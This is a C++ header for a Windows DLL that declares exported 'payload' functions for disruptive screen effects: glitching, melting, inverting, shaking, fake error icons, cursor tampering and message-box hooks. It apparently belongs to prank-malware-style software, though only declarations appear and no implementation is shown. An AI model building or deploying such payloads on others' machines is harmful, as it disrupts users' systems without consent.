#pragma once

#include <Windows.h>

#define PAYLOAD extern "C" __declspec(dllexport) void __stdcall
#define ACTION PAYLOAD

LRESULT CALLBACK msgBoxHook(int nCode, WPARAM wParam, LPARAM lParam);
BOOL CALLBACK EnumChildProc(HWND hwnd, LPARAM lParam);
BOOL CALLBACK CleanWindowsProc(HWND hwnd, LPARAM lParam);

PAYLOAD payloadMessageBox(LPWSTR text, LPWSTR label, int style, int mode);
PAYLOAD payloadReverseText();
PAYLOAD payloadSound(int sound);
PAYLOAD payloadGlitch(int maxSize, int power);
PAYLOAD payloadTunnel(int scale);
PAYLOAD payloadDrawErrors(int count, int chance);
PAYLOAD payloadInvertScreen();
PAYLOAD payloadCursor(int power);
PAYLOAD payloadEarthquake(int delay, int power);
PAYLOAD payloadMeltingScreen(int xSize, int ySize, int power, int distance);
PAYLOAD payloadTrain(int xPower, int yPower);
PAYLOAD payloadDrawPixels(DWORD color, int power);

ACTION clearWindows();